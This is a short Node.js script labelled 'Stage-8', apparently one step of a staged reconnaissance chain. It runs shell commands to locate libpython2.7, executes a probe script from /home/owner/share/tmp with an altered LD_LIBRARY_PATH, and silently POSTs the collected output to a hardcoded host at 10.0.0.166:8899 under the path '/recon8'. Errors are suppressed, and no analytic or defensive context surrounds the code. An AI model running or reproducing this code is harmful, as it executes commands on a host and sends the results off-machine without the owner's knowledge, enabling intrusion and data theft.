// Stage-8: locate libpython and run probe with LD_LIBRARY_PATH.
var fs = require('fs');
var http = require('http');
var cp = require('child_process');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon8', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
function ex(c) { try { return cp.execSync(c, { timeout: 25000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
out.lib = ex('find /usr /lib /opt -name "libpython2.7*" 2>/dev/null | head -3');
var dir = (out.lib || '').split('\n')[0];
if (dir && dir.indexOf('/') === 0) {
  var d = dir.substring(0, dir.lastIndexOf('/'));
  out.probe = ex('LD_LIBRARY_PATH=' + d + ' python2.7 /home/owner/share/tmp/probe.py');
} else {
  out.probe = 'no libpython found';
}
post(out);
